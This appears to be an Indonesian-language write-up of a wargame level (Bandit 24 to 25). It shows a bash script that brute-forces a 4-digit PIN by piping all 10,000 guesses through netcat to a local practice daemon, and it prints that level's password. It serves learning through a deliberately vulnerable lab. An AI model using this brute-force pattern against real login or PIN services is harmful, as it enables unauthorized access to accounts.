# Bandit Level 24 → Level 25

![Difficulty](https://img.shields.io/badge/Difficulty-Medium-yellow)

## 🎯 Objective
Sebuah layanan *daemon* mendengarkan (listening) di port **30002**. Layanan ini meminta password level saat ini (Bandit24) dan sebuah PIN rahasia 4 digit (0000 - 9999). Kita harus melakukan *Brute Force* (mencoba semua kemungkinan) untuk menemukan PIN yang benar.

## 🛠 The Process
Karena mencoba 10.000 kemungkinan secara manual tidak mungkin dilakukan, saya membuat *script* otomatis.

1. **Persiapan Script Generator:**
   Saya membuat script bash sederhana bernama `brute.sh` yang akan mencetak kombinasi password dan angka dari 0000 hingga 9999.

   ```bash
   mkdir -p /tmp/adrian_brute
   cd /tmp/adrian_brute
   nano brute.sh
   ```
   
   Isi script brute.sh:
   ```Bash
    #!/bin/bash
    for i in {0000..9999}
    do
        echo "gb8KRRCsshuZXI0tUuR6ypOFjiZbf3G8 $i"
    done
    ```
    (Script ini menggunakan for loop untuk menghasilkan urutan angka).

 2. **Eksekusi Serangan:**
    Setelah memberikan izin eksekusi (chmod +x brute.sh), saya menjalankan script dan mengirimkan outputnya langsung ke port server menggunakan nc (Netcat).

    Agar layar tidak penuh dengan pesan gagal, saya memfilter outputnya menggunakan grep -v untuk menyembunyikan kata "Wrong".
    
    ```Bash
    chmod +x brute.sh
    ./brute.sh | nc localhost 30002 | grep -v "Wrong"
    ```
    
    Penjelasan Command:

    - `./brute.sh`: Menghasilkan 10.000 baris password + PIN.
    - `|`: Pipa (pipe) untuk mengalirkan output ke perintah berikutnya.
    - `nc localhost 30002`: Mengirim data ke server.
    - `grep -v "Wrong"`: Hanya menampilkan baris yang TIDAK mengandung kata "Wrong".

   3. **Hasil:**
    Setelah menunggu proses berjalan, server merespons dengan satu baris yang berisi password untuk level 25.

  ## 💡 What I Learned
  - Bash Loops: Cara menggunakan `for i in {0000..9999}` untuk membuat perulangan angka dengan cepat.
  - Brute Force Attack: Konsep serangan menebak password dengan mencoba semua kombinasi yang mungkin.
  - Socket Piping: Mengirim output dari script lokal langsung ke layanan jaringan (network socket) seolah-olah kita mengetiknya secara manual.
  - Output Filtering: Menggunakan `grep -v` (invert match) untuk membersihkan log sampah dan fokus pada informasi penting.

   [⬅️ Back To Home](../README.md)
